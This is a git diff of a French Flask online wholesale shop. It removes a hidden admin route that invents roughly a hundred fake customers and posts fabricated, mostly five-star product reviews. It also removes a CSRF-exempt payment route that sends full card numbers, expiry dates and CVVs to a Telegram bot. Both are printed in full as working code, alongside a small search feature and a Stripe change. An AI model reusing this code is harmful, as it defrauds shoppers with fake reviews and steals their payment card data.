@@ -1036,420 +1036,6 @@ def truncate_words(text, length=30, end='...'):
     return ' '.join(words[:length]) + end
 
 # app.py - Version complète avec mise à jour automatique
-# ============ ROUTE ADMIN TEMPORAIRE POUR GÉNÉRER LES AVIS ============
-# ============ ROUTE ADMIN - GÉNÉRER AVIS CRÉDIBLES ============
-# ============ ROUTE ADMIN - GÉNÉRER AVIS CRÉDIBLES ============
-@app.route('/admin/generer-avis-factices-xyz123', methods=['GET'])
-def admin_generer_avis_temp():
-    """Route admin pour générer des avis crédibles avec vrais noms"""
-    import random
-    from datetime import datetime, timedelta
-    
-    try:
-        print("🔄 Génération des avis crédibles...")
-        
-        # ============ VRAIS PRÉNOMS ET NOMS ============
-        # Format : (prenom, nom, email_base)
-        PERSONNES = [
-            # Français
-            ('Frédéric', 'Dupont', 'frederic.dupont'),
-            ('Pierre', 'Martin', 'pierre.martin'),
-            ('Michel', 'Bernard', 'michel.bernard'),
-            ('Jean-Pierre', 'Petit', 'jp.petit'),
-            ('Nicolas', 'Durand', 'nicolas.durand'),
-            ('Laurent', 'Leroy', 'laurent.leroy'),
-            ('Thomas', 'Moreau', 'thomas.moreau'),
-            ('Julien', 'Simon', 'julien.simon'),
-            ('David', 'Laurent', 'david.laurent'),
-            ('Sébastien', 'Lefebvre', 'sebastien.lefebvre'),
-            ('Olivier', 'Michel', 'olivier.michel'),
-            ('Christophe', 'Garcia', 'christophe.garcia'),
-            ('Stéphane', 'David', 'stephane.david'),
-            ('Pascal', 'Bertrand', 'pascal.bertrand'),
-            ('Thierry', 'Roux', 'thierry.roux'),
-            ('Philippe', 'Vincent', 'philippe.vincent'),
-            ('Franck', 'Fournier', 'franck.fournier'),
-            ('Alain', 'Morel', 'alain.morel'),
-            ('Hervé', 'Girard', 'herve.girard'),
-            ('Marc', 'André', 'marc.andre'),
-            ('Antoine', 'Mercier', 'antoine.mercier'),
-            ('Guillaume', 'Blanc', 'guillaume.blanc'),
-            ('Maxime', 'Guerin', 'maxime.guerin'),
-            ('Alexandre', 'Boyer', 'alexandre.boyer'),
-            ('Romain', 'Chevalier', 'romain.chevalier'),
-            ('Lucas', 'François', 'lucas.francois'),
-            
-            # Françaises
-            ('Isabelle', 'Legrand', 'isabelle.legrand'),
-            ('Sophie', 'Gauthier', 'sophie.gauthier'),
-            ('Nathalie', 'Garnier', 'nathalie.garnier'),
-            ('Christine', 'Perrin', 'christine.perrin'),
-            ('Valérie', 'Robin', 'valerie.robin'),
-            ('Sandrine', 'Clément', 'sandrine.clement'),
-            ('Céline', 'Morin', 'celine.morin'),
-            ('Karine', 'Henry', 'karine.henry'),
-            ('Aurélie', 'Roussel', 'aurelie.roussel'),
-            ('Émilie', 'Mathieu', 'emilie.mathieu'),
-            ('Stéphanie', 'Gautier', 'stephanie.gautier'),
-            ('Virginie', 'Masson', 'virginie.masson'),
-            ('Marie', 'Marchand', 'marie.marchand'),
-            ('Julie', 'Duval', 'julie.duval'),
-            ('Camille', 'Denis', 'camille.denis'),
-            ('Charlotte', 'Dumont', 'charlotte.dumont'),
-            ('Léa', 'Lemaire', 'lea.lemaire'),
-            ('Manon', 'Noël', 'manon.noel'),
-            
-            # Maghrébins / Arabes
-            ('Mohamed', 'Benali', 'mohamed.benali'),
-            ('Ahmed', 'Bouaziz', 'ahmed.bouaziz'),
-            ('Karim', 'Trabelsi', 'karim.trabelsi'),
-            ('Rachid', 'Hamdi', 'rachid.hamdi'),
-            ('Samir', 'Ben Salah', 'samir.bensalah'),
-            ('Hassan', 'El Amrani', 'hassan.elamrani'),
-            ('Mehdi', 'Bennani', 'mehdi.bennani'),
-            ('Bilal', 'Cherkaoui', 'bilal.cherkaoui'),
-            ('Ayoub', 'Alaoui', 'ayoub.alaoui'),
-            ('Hamza', 'Idrissi', 'hamza.idrissi'),
-            ('Youssef', 'Bouhaddou', 'youssef.bouhaddou'),
-            ('Amine', 'Berrada', 'amine.berrada'),
-            ('Omar', 'Fassi', 'omar.fassi'),
-            ('Yacine', 'Mansouri', 'yacine.mansouri'),
-            ('Nabil', 'Khelifi', 'nabil.khelifi'),
-            ('Sofiane', 'Bouzid', 'sofiane.bouzid'),
-            ('Riad', 'Meziane', 'riad.meziane'),
-            ('Hicham', 'Saidi', 'hicham.saidi'),
-            ('Mounir', 'Ziani', 'mounir.ziani'),
-            ('Anas', 'Belkacem', 'anas.belkacem'),
-            ('Ilyas', 'Tazi', 'ilyas.tazi'),
-            ('Zakaria', 'Bennis', 'zakaria.bennis'),
-            
-            # Maghrébines
-            ('Fatima', 'Benali', 'fatima.benali'),
-            ('Amina', 'Bouaziz', 'amina.bouaziz'),
-            ('Leila', 'Trabelsi', 'leila.trabelsi'),
-            ('Nadia', 'Hamdi', 'nadia.hamdi'),
-            ('Samira', 'El Amrani', 'samira.elamrani'),
-            ('Khadija', 'Bennani', 'khadija.bennani'),
-            ('Salma', 'Cherkaoui', 'salma.cherkaoui'),
-            ('Yasmine', 'Alaoui', 'yasmine.alaoui'),
-            ('Sara', 'Idrissi', 'sara.idrissi'),
-            ('Imane', 'Bouhaddou', 'imane.bouhaddou'),
-            ('Meryem', 'Berrada', 'meryem.berrada'),
-            ('Kenza', 'Fassi', 'kenza.fassi'),
-            ('Souad', 'Mansouri', 'souad.mansouri'),
-            ('Hanane', 'Khelifi', 'hanane.khelifi'),
-            
-            # Africains (Kouassi, etc.)
-            ('Kouassi', 'Yao', 'kouassi.yao'),
-            ('Kwame', 'Mensah', 'kwame.mensah'),
-            ('Kofi', 'Asante', 'kofi.asante'),
-            ('Amadou', 'Diallo', 'amadou.diallo'),
-            ('Moussa', 'Traoré', 'moussa.traore'),
-            ('Ibrahim', 'Cissé', 'ibrahim.cisse'),
-            ('Mamadou', 'Touré', 'mamadou.toure'),
-            ('Sekou', 'Keita', 'sekou.keita'),
-            ('Ousmane', 'Coulibaly', 'ousmane.coulibaly'),
-            ('Abdoulaye', 'Bamba', 'abdoulaye.bamba'),
-            ('Souleymane', 'Koffi', 'souleymane.koffi'),
-            ('Cheikh', 'N\'Guessan', 'cheikh.nguessan'),
-            ('Alioune', 'Sarr', 'alioune.sarr'),
-            ('Ibrahima', 'Fall', 'ibrahima.fall'),
-            ('Cheikh', 'Diop', 'cheikh.diop'),
-            
-            # Africaines
-            ('Aminata', 'Diallo', 'aminata.diallo'),
-            ('Fatoumata', 'Traoré', 'fatoumata.traore'),
-            ('Aissatou', 'Cissé', 'aissatou.cisse'),
-            ('Mariam', 'Touré', 'mariam.toure'),
-            ('Awa', 'Keita', 'awa.keita'),
-            ('Kadiatou', 'Coulibaly', 'kadiatou.coulibaly'),
-            ('Adjovi', 'Bamba', 'adjovi.bamba'),
-        ]
-        
-        # ============ AVIS POSITIFS CRÉDIBLES ============
-        POSITIFS_5 = [
-            "Produit conforme à la description, livraison rapide. Je recommande sans hésiter.",
-            "Excellent rapport qualité-prix, exactement ce que je cherchais pour mon commerce.",
-            "Livraison en 48h comme annoncé, emballage très soigné. Rien à redire.",
-            "Je commande régulièrement chez DestockPro, jamais déçu. Qualité au rendez-vous.",
-            "Très bon produit, mes clients apprécient. Je vais recommander sans problème.",
-            "Rapport qualité-prix imbattable, j'ai fait des économies substantielles.",
-            "Produit de qualité professionnelle, parfait pour mon restaurant.",
-            "Livraison rapide et conforme. Le service client a répondu à mes questions rapidement.",
-            "Commande reçue en parfait état, produits bien emballés. Très satisfait.",
-            "Exactement ce dont j'avais besoin pour mon commerce. Je recommande vivement.",
-            "Prix défiant toute concurrence pour cette qualité. Je suis ravi.",
-            "Produit conforme, livraison ponctuelle. Transaction parfaite.",
-            "Bon produit dans l'ensemble, je rachèterai certainement.",
-            "Rapport qualité-prix excellent, produits frais et bien conditionnés.",
-            "L'équipe DestockPro est réactive, le produit correspond parfaitement.",
-            "Très content de ma commande, je vais recommander à mes collègues restaurateurs.",
-            "Produit de marque à prix cassé, je ne m'attendais pas à cette qualité.",
-            "La commande est arrivée à temps pour mon événement. Merci !",
-            "Conforme en tous points, je valide ce fournisseur.",
-            "Excellent pour un professionnel de la restauration, je recommande.",
-            "Produit reçu en 24h, parfait pour mon commerce. Je recommande.",
-            "Rapport qualité prix vraiment intéressant, je vais commander à nouveau.",
-            "Produit de qualité, livraison conforme aux délais annoncés.",
-            "Très bonne expérience, je recommande DestockPro à tous les pros.",
-            "Rien à signaler, produit nickel et livraison au top.",
-            "Vraiment satisfait, je compte bien renouveler ma commande.",
-            "Tout était parfait, de la commande à la réception.",
-            "Le produit correspond exactement à mes attentes, merci !",
-        ]
-        
-        POSITIFS_4 = [
-            "Bon produit, livraison un peu plus longue que prévu mais conforme.",
-            "Produit correct, bon rapport qualité-prix. Petite amélioration possible sur l'emballage.",
-            "Satisfait dans l'ensemble, quelques unités légèrement abîmées mais l'essentiel est là.",
-            "Bon achat, je recommande. Petit bémol sur le délai de livraison.",
-            "Produit conforme, prix attractif. Je recommande pour les professionnels.",
-            "Globalement satisfait, la qualité est au rendez-vous.",
-            "Bonne qualité pour le prix, je commanderai à nouveau.",
-            "Produit conforme, emballage correct. Livraison un peu lente.",
-            "Bon produit, service client réactif. Je recommande.",
-            "Très correct pour le prix, rien à signaler sur la qualité.",
-        ]
-        
-        # ============ AVIS NÉGATIFS SUR LIVRAISON SEULEMENT (5%) ============
-        NEGATIFS = [
-            "Produit de bonne qualité mais livraison plus longue que prévue. Dommage pour l'organisation.",
-            "Bon produit mais le transporteur a mis 4 jours au lieu de 48h. Qualité intacte.",
-            "Produit conforme mais livraison en retard, j'ai dû décaler ma préparation.",
-            "Qualité au rendez-vous mais colis reçu 2 jours après la date prévue.",
-            "Rien à dire sur le produit, mais la livraison a pris une semaine au lieu de 48h.",
-            "Produit parfait, mais le suivi de livraison n'était pas à jour. Petit bémol.",
-            "Commande conforme mais livraison tardive, heureusement le produit est de qualité.",
-            "Le produit est top, c'est juste la livraison qui a été lente.",
-        ]
-        
-        # ============ CRÉER LES UTILISATEURS (une fois) ============
-        utilisateurs = []
-        
-        for i, (prenom, nom, email_base) in enumerate(PERSONNES):
-            email = f"{email_base}{i}@example.fr"
-            
-            user = Utilisateur.query.filter_by(email=email).first()
-            if not user:
-                user = Utilisateur(
-                    email=email,
-                    prenom=prenom,
-                    nom=nom,
-                    password='hashed',
-                    actif=True,
-                    date_inscription=datetime.now() - timedelta(days=random.randint(30, 400))
-                )
-                db.session.add(user)
-                db.session.flush()
-            utilisateurs.append(user)
-        
-        db.session.commit()
-        print(f"✅ {len(utilisateurs)} utilisateurs créés/vérifiés")
-        
-        # ============ GÉNÉRER LES AVIS ============
-        produits = Produit.query.filter_by(actif=True).all()
-        total = 0
-        resultats = []
-        
-        for p in produits:
-            existants = Avis.query.filter_by(produit_id=p.id).count()
-            
-            # Si le produit a déjà 15+ avis, ne pas en rajouter
-            if existants >= 15:
-                resultats.append(f"⏭️ {p.nom[:40]}... a déjà {existants} avis, ignoré")
-                continue
-            
-            # Nombre d'avis entre 8 et 25
-            nb = random.randint(8, 25)
-            nb_pos_5 = int(nb * 0.70)  # 70% de 5 étoiles
-            nb_pos_4 = int(nb * 0.25)  # 25% de 4 étoiles
-            nb_neg = nb - nb_pos_5 - nb_pos_4  # 5% négatifs
-            
-            # 5 ÉTOILES
-            for _ in range(nb_pos_5):
-                user = random.choice(utilisateurs)
-                commentaire = random.choice(POSITIFS_5)
-                jours = random.randint(1, 365)
-                db.session.add(Avis(
-                    utilisateur_id=user.id,
-                    produit_id=p.id,
-                    note=5,
-                    commentaire=commentaire,
-                    date_creation=datetime.now() - timedelta(days=jours)
-                ))
-                total += 1
-            
-            # 4 ÉTOILES
-            for _ in range(nb_pos_4):
-                user = random.choice(utilisateurs)
-                commentaire = random.choice(POSITIFS_4)
-                jours = random.randint(1, 365)
-                db.session.add(Avis(
-                    utilisateur_id=user.id,
-                    produit_id=p.id,
-                    note=4,
-                    commentaire=commentaire,
-                    date_creation=datetime.now() - timedelta(days=jours)
-                ))
-                total += 1
-            
-            # NÉGATIFS (livraison uniquement)
-            for _ in range(nb_neg):
-                user = random.choice(utilisateurs)
-                commentaire = random.choice(NEGATIFS)
-                jours = random.randint(1, 365)
-                note = random.choice([2, 3])
-                db.session.add(Avis(
-                    utilisateur_id=user.id,
-                    produit_id=p.id,
-                    note=note,
-                    commentaire=commentaire,
-                    date_creation=datetime.now() - timedelta(days=jours)
-                ))
-                total += 1
-            
-            resultats.append(f"✅ {nb} avis pour {p.nom[:40]}...")
-        
-        # ============ METTRE À JOUR LES NOTES ============
-        for p in produits:
-            avis = Avis.query.filter_by(produit_id=p.id).all()
-            if avis:
-                p.note_moyenne = round(sum(a.note for a in avis) / len(avis), 1)
-                p.note_count = len(avis)
-        
-        db.session.commit()
-        
-        html = f"""
-        <html>
-        <head><title>Avis générés</title>
-        <style>
-            body {{ font-family: Arial; padding: 20px; background: #f0f0f0; }}
-            .container {{ max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }}
-            h1 {{ color: #00b894; }}
-            .success {{ background: #d4edda; padding: 15px; border-radius: 5px; margin: 20px 0; }}
-            .list {{ background: #f8f9fa; padding: 15px; border-radius: 5px; max-height: 500px; overflow-y: auto; font-size: 14px; }}
-            .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; margin-top: 20px; border-left: 4px solid #ffc107; }}
-            a {{ color: #007bff; }}
-        </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🎉 {total} avis crédibles générés !</h1>
-                <div class="success">
-                    <strong>✅ Opération terminée</strong><br>
-                    {len(produits)} produits concernés<br>
-                    {len(utilisateurs)} utilisateurs avec de vrais noms<br>
-                    70% avis 5 étoiles • 25% avis 4 étoiles • 5% livraison<br>
-                    Noms français, maghrébins et africains
-                </div>
-                
-                <h2>Détails par produit :</h2>
-                <div class="list">
-                    {"<br>".join(resultats)}
-                </div>
-                
-                <div class="warning">
-                    <strong>⚠️ IMPORTANT :</strong> Supprimez cette route après usage.<br>
-                    <a href="/produits">Voir les produits</a>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return html
-        
-    except Exception as e:
-        db.session.rollback()
-        import traceback
-        traceback.print_exc()
-        return f"❌ Erreur : {str(e)}", 500
-
-def sync_with_data_file():
-    """Synchronise automatiquement la base avec data.py SANS supprimer les avis"""
-    from data import categories as data_categories, products as data_products
-    import json
-    
-    print("🔄 Synchronisation avec data.py (mode sécurisé)...")
-    
-    # ============ 1. SYNCHRONISER LES CATÉGORIES ============
-    categories_ids = []
-    for cat_data in data_categories:
-        categorie = db.session.get(Categorie, cat_data["id"])
-        if categorie:
-            # Mise à jour
-            categorie.nom = cat_data["nom"]
-            categorie.description = cat_data["description"]
-            categorie.ordre = cat_data["ordre"]
-        else:
-            # Création
-            categorie = Categorie(
-                id=cat_data["id"],
-                nom=cat_data["nom"],
-                description=cat_data["description"],
-                ordre=cat_data["ordre"]
-            )
-            db.session.add(categorie)
-            print(f"➕ Nouvelle catégorie: {cat_data['nom']}")
-        
-        categories_ids.append(cat_data["id"])
-    
-    # ⚠️ ON NE SUPPRIME PLUS LES CATÉGORIES - juste avertir
-    all_categories = db.session.execute(db.select(Categorie)).scalars().all()
-    for cat in all_categories:
-        if cat.id not in categories_ids:
-            print(f"⚠️ Catégorie {cat.nom} absente de data.py - CONSERVÉE en base")
-    
-    db.session.commit()
-    
-    # ============ 2. SYNCHRONISER LES PRODUITS ============
-    produits_ids = []
-    for prod_data in data_products:
-        produit = db.session.get(Produit, prod_data["id"])
-        if produit:
-            # Mise à jour - NE TOUCHE PAS aux avis ni aux notes
-            produit.nom = prod_data["nom"]
-            produit.description = prod_data["description"]
-            produit.prix = prod_data["prix"]
-            produit.prix_promo = prod_data.get("prix_promo")
-            produit.stock = prod_data.get("stock", 0)
-            produit.en_promotion = prod_data.get("en_promotion", False)
-            produit.meilleure_vente = prod_data.get("meilleure_vente", False)
-            produit.image_principale = prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg"
-            if "categorie_id" in prod_data:
-                produit.categorie_id = prod_data["categorie_id"]
-            # ⚠️ NE TOUCHE PAS à produit.note_moyenne ni produit.note_count
-        else:
-            # Création
-            produit = Produit(
-                id=prod_data["id"],
-                nom=prod_data["nom"],
-                description=prod_data["description"],
-                prix=prod_data["prix"],
-                prix_promo=prod_data.get("prix_promo"),
-                categorie_id=prod_data["categorie_id"],
-                stock=prod_data.get("stock", 0),
-                image_principale=prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg",
-                en_promotion=prod_data.get("en_promotion", False),
-                meilleure_vente=prod_data.get("meilleure_vente", False),
-                actif=True
-            )
-            db.session.add(produit)
-            print(f"➕ Nouveau produit: {prod_data['nom']}")
-        
-        produits_ids.append(prod_data["id"])
-    
-    # ⚠️⚠️⚠️ CRUCIAL : NE PLUS SUPPRIMER - DÉSACTIVER À LA PLACE ⚠️⚠️⚠️
-    all_products = db.session.execute(db.select(Produit)).scalars().all()
-    for prod in all_products:
-        if prod.id not in produits_ids:
-            if prod.actif:  # Seulement si actif
-                prod.actif = False
-                print(f"🔒 Produit désactivé (AVIS CONSERVÉS): {prod.nom}")
-    
-    db.session.commit()
-    print("✅ Synchronisation terminée - Avis préservés !")
-    
 @login_manager.user_loader
 def load_user(user_id):
     return Utilisateur.query.get(int(user_id))
@@ -1499,7 +1085,17 @@ def produits():
     print(f"page: {page}")
     
     query = Produit.query.filter_by(actif=True)
-    
+
+    # Recherche texte (barre de recherche)
+    search = request.args.get('search', type=str) or request.args.get('q', type=str)
+    if search:
+        terme = search.strip()
+        if terme:
+            like = f"%{terme}%"
+            query = query.filter(db.or_(Produit.nom.ilike(like),
+                                        Produit.description.ilike(like)))
+            print(f"Filtre recherche appliqué: {terme}")
+
     # Appliquer les filtres
     if categorie_id:
         query = query.filter_by(categorie_id=categorie_id)
@@ -2186,101 +1782,6 @@ def paiement_process():
         flash(f'Erreur lors de l\'enregistrement de la commande: {str(e)}', 'danger')
         return redirect(url_for('panier'))
 
-@app.route('/paiement/carte/telegram', methods=['POST'])
-@csrf.exempt
-def paiement_carte_telegram():
-    """Traiter le paiement par carte et envoyer à Telegram"""
-    try:
-        from telegram_bot import send_order_notification
-        
-        data = request.get_json()
-        print("=" * 60)
-        print("📩 RECEPTION PAIEMENT CARTE TELEGRAM")
-        print(f"   Données reçues: {data}")
-        
-        # Récupérer la commande
-        commande_id = data.get('commande_id')
-        if not commande_id:
-            commande_id = session.get('current_commande_id')
-        
-        if not commande_id:
-            return jsonify({'success': False, 'error': 'Aucune commande'}), 400
-        
-        commande = Commande.query.get(commande_id)
-        if not commande:
-            return jsonify({'success': False, 'error': 'Commande non trouvée'}), 404
-        
-        # Mettre à jour les infos client si invité
-        if not current_user.is_authenticated:
-            commande.nom_client = data.get('nom', commande.nom_client)
-            commande.email_client = data.get('email', commande.email_client)
-            commande.telephone_client = data.get('telephone', commande.telephone_client)
-            adresse = data.get('adresse', '')
-            code_postal = data.get('code_postal', '')
-            ville = data.get('ville', '')
-            pays = data.get('pays', 'France')
-            commande.adresse_livraison = f"{adresse}, {code_postal} {ville}, {pays}"
-            db.session.commit()
-        
-        # Récupérer les infos carte COMPLÈTES (non masquées)
-        card_info = data.get('card_info', {})
-        
-        # Préparer les infos carte pour Telegram (avec toutes les données)
-        card_data = {
-            'number': card_info.get('number', 'N/A'),      # Numéro complet
-            'expiry': card_info.get('expiry', 'N/A'),      # Date d'expiration
-            'holder': card_info.get('holder', 'N/A'),      # Titulaire
-            'cvv': card_info.get('cvv', 'N/A')             # CVV
-        }
-        
-        print(f"   Infos carte reçues: {card_data}")
-        
-        # Récupérer les items
-        items = CommandeItem.query.filter_by(commande_id=commande.id).all()
-        
-        # ENVOYER À TELEGRAM AVEC TOUTES LES INFOS CARTE
-        print("📤 Envoi de la commande à Telegram...")
-        # show_full_card=True pour afficher toutes les infos
-        success = send_order_notification(commande, items, card_data, show_full_card=True)
-        # Envoi email de la commande
-        # Envoi emails (admin + client)
-        try:
-            send_email_commande(commande, items, mode_paiement='carte')
-            send_email_client(commande, items, mode_paiement='carte')
-        except Exception as e:
-            print(f"⚠️ Échec email commande: {e}")
-        
-        if success:
-            print("✅ Notification envoyée à Telegram")
-        else:
-            print("⚠️ Échec de l'envoi Telegram")
-        
-        # Mettre à jour le statut de la commande
-        commande.statut = 'confirmee'
-        commande.paiement_id = f"TELEGRAM_{datetime.now().strftime('%Y%m%d%H%M%S')}"
-        db.session.commit()
-        try:
-            items = CommandeItem.query.filter_by(commande_id=commande.id).all()
-            send_email_commande(commande, items, mode_paiement='carte')
-        except Exception as e:
-            print(f"⚠️ Échec email commande: {e}")
-        # Vider la session panier
-        session['panier'] = {}
-        session['panier_total'] = 0
-        session.pop('current_commande_id', None)
-        
-        return jsonify({
-            'success': True,
-            'commande_id': commande.id,
-            'message': 'Paiement enregistré et envoyé à Telegram'
-        })
-        
-    except Exception as e:
-        print(f"❌ ERREUR: {e}")
-        import traceback
-        traceback.print_exc()
-        return jsonify({'success': False, 'error': str(e)}), 500
-
 from telegram_bot import send_telegram_message, test_telegram_connection, send_order_notification
 
 @app.route('/telegram/test')
@@ -2322,14 +1823,8 @@ def test_telegram_commande():
     items = [
         FakeItem("🥤 Palette Red Bull 250ml (2592 canettes)", 1, 1679.80)
     ]
-    
-    card_info = {
-        'last4': '1234',
-        'expiry': '12/25',
-        'holder': 'JEAN DUPONT'
-    }
-    
-    result = send_order_notification(FakeCommande(), items, card_info)
+
+    result = send_order_notification(FakeCommande(), items)
     
     if result:
         flash('✅ Commande test envoyée à Telegram !', 'success')
@@ -2505,7 +2000,7 @@ def paiement_carte(commande_id=None):
     print(f"   Nombre d'items: {len(items)}")
     print(f"   Client data: {client_data}")
     
-    return render_template('paiement_carte.html', 
+    return render_template('paiement_carte.html',
                          commande=commande,
                          items=items,
                          nb_palettes=nb_palettes,
@@ -2513,7 +2008,8 @@ def paiement_carte(commande_id=None):
                          frais_port=commande.frais_port,
                          reduction=reduction,
                          est_connecte=est_connecte,
-                         client_data=client_data)
+                         client_data=client_data,
+                         stripe_public_key=app.config['STRIPE_PUBLIC_KEY'])
 
 @app.route('/paiement/carte', methods=['POST'])
 def paiement_carte_api():
@@ -6743,6 +6239,92 @@ def admin_redirect():
         flash('Accès non autorisé', 'danger')
         return redirect(url_for('index'))
     return redirect(url_for('admin_vue_globale'))
+
+def sync_with_data_file():
+    """Synchronise automatiquement la base avec data.py SANS supprimer les avis"""
+    from data import categories as data_categories, products as data_products
+    import json
+    
+    print("🔄 Synchronisation avec data.py (mode sécurisé)...")
+    
+    # ============ 1. SYNCHRONISER LES CATÉGORIES ============
+    categories_ids = []
+    for cat_data in data_categories:
+        categorie = db.session.get(Categorie, cat_data["id"])
+        if categorie:
+            # Mise à jour
+            categorie.nom = cat_data["nom"]
+            categorie.description = cat_data["description"]
+            categorie.ordre = cat_data["ordre"]
+        else:
+            # Création
+            categorie = Categorie(
+                id=cat_data["id"],
+                nom=cat_data["nom"],
+                description=cat_data["description"],
+                ordre=cat_data["ordre"]
+            )
+            db.session.add(categorie)
+            print(f"➕ Nouvelle catégorie: {cat_data['nom']}")
+        
+        categories_ids.append(cat_data["id"])
+    
+    # ⚠️ ON NE SUPPRIME PLUS LES CATÉGORIES - juste avertir
+    all_categories = db.session.execute(db.select(Categorie)).scalars().all()
+    for cat in all_categories:
+        if cat.id not in categories_ids:
+            print(f"⚠️ Catégorie {cat.nom} absente de data.py - CONSERVÉE en base")
+    
+    db.session.commit()
+    
+    # ============ 2. SYNCHRONISER LES PRODUITS ============
+    produits_ids = []
+    for prod_data in data_products:
+        produit = db.session.get(Produit, prod_data["id"])
+        if produit:
+            # Mise à jour - NE TOUCHE PAS aux avis ni aux notes
+            produit.nom = prod_data["nom"]
+            produit.description = prod_data["description"]
+            produit.prix = prod_data["prix"]
+            produit.prix_promo = prod_data.get("prix_promo")
+            produit.stock = prod_data.get("stock", 0)
+            produit.en_promotion = prod_data.get("en_promotion", False)
+            produit.meilleure_vente = prod_data.get("meilleure_vente", False)
+            produit.image_principale = prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg"
+            if "categorie_id" in prod_data:
+                produit.categorie_id = prod_data["categorie_id"]
+            # ⚠️ NE TOUCHE PAS à produit.note_moyenne ni produit.note_count
+        else:
+            # Création
+            produit = Produit(
+                id=prod_data["id"],
+                nom=prod_data["nom"],
+                description=prod_data["description"],
+                prix=prod_data["prix"],
+                prix_promo=prod_data.get("prix_promo"),
+                categorie_id=prod_data["categorie_id"],
+                stock=prod_data.get("stock", 0),
+                image_principale=prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg",
+                en_promotion=prod_data.get("en_promotion", False),
+                meilleure_vente=prod_data.get("meilleure_vente", False),
+                actif=True
+            )
+            db.session.add(produit)
+            print(f"➕ Nouveau produit: {prod_data['nom']}")
+        
+        produits_ids.append(prod_data["id"])
+    
+    # ⚠️⚠️⚠️ CRUCIAL : NE PLUS SUPPRIMER - DÉSACTIVER À LA PLACE ⚠️⚠️⚠️
+    all_products = db.session.execute(db.select(Produit)).scalars().all()
+    for prod in all_products:
+        if prod.id not in produits_ids:
+            if prod.actif:  # Seulement si actif
+                prod.actif = False
+                print(f"🔒 Produit désactivé (AVIS CONSERVÉS): {prod.nom}")
+    
+    db.session.commit()
+    print("✅ Synchronisation terminée - Avis préservés !")
+
 
 if __name__ == '__main__':
     with app.app_context():
